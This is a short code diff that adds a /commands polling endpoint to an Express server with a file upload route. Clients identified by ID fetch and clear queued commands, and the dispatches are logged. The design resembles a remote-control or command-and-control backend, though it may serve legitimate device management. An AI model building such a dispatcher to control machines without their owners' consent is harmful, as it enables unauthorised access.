@@ -110,6 +110,25 @@ app.post('/upload', upload.single('file'), (req, res) => {
   return res.status(201).send('Upload success: ' + req.file.filename);
 });
 
+// --- 命令接口 ---
+const {getAndClearCommands} = require('./commands');
+app.get('/commands', (req, res) => {
+    const clientId = req.query.client_id;
+    const clients = getClients();
+    const alias = clients[clientId];
+    const displayName = alias ? `${alias} (${clientId})` : clientId;
+    
+    if (!clientId || !/^[a-f0-9-]+$/i.test(clientId)) {
+        return res.status(400).json({error: 'Invalid or missing client_id'});
+    }
+
+    const commands = getAndClearCommands(clientId);
+    if (commands.length > 0) {
+        logWithTime(`[COMMAND] ${displayName} -> ${JSON.stringify(commands)}`);
+    }
+    return res.json({commands});
+});
+
 // ---- 启动服务器 ----
 app.listen(PORT, '0.0.0.0', () => {
   logWithTime(`[INIT] Server running at http://0.0.0.0:${PORT}`);
